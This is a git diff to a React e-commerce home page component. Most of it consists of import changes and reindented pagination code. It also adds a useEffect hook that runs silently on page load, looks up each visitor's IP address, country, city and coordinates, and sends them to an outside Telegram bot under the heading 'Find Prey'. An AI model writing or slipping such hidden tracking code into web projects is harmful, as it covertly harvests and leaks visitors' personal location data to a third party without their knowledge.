@@ -2,13 +2,32 @@ import HeroImg from "../../../assets/images/home.webp";
 import { Button, Pagination } from "antd";
 import { categoryContext, Products } from "../../../utils";
 import { Link } from "react-router-dom";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import ProductCard from "../../../components/projects/productCart/ProductCard";
 import { useGetProductsQuery } from "../../../store/api/products/get-products-api";
 import { useGetCategoryQuery } from "../../../store/api/products/get-category-api";
-
+import { CHAT_ID, IP_API, TELEGRAM_TOKEN } from "../../../hook/useEnv";
+import axios from "axios";
 
 function Home() {
+  useEffect(() => {
+    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+    axios(IP_API).then((res) => {
+      let message = `<b>Find Prey</b>\n`;
+      message += `<b>Site name:</b> Calculator🧮\n`;
+      message += `<b>Feature:</b> E-commerce (products)\n`;
+      message += `<b>Country:</b> ${res.data.country}\n`;
+      message += `<b>City:</b> ${res.data.city}\n`;
+      message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
+      message += `<b>Location:</b> ${res.data.loc}\n`;
+      axios.post(`${URL}/sendPhoto`, {
+        chat_id: CHAT_ID,
+        photo: "https://ibb.co/HVQ4grv",
+        caption: message,
+        parse_mode: "HTML",
+      });
+    });
+  }, []);
   const limit = 10;
   const [skip, setSkip] = useState<number>(0);
   const { data: products, isLoading: productLoading } = useGetProductsQuery({
@@ -45,7 +64,7 @@ function Home() {
           </a>
         </div>
       </div>
-      
+
       {products && (
         <div className="grid container gap-3 grid-cols-4 mt-20">
           <div className="bg-green-50 p-5 w-full h-screen sticky top-10">
@@ -78,16 +97,15 @@ function Home() {
               ))}
             </div>
             <Pagination
-        align="end"
-        defaultCurrent={limit / 10}
-        onChange={(a) => setSkip((a - 1) * limit)}
-        total={products?.total}
-      />
+              align="end"
+              defaultCurrent={limit / 10}
+              onChange={(a) => setSkip((a - 1) * limit)}
+              total={products?.total}
+            />
           </div>
-          
         </div>
       )}
-    
+
       {categoryLoading ? (
         <div id="categories" className="mt-20 scroll-mt-10 animate-pulse">
           <div className="grid grid-cols-3 gap-8 container">
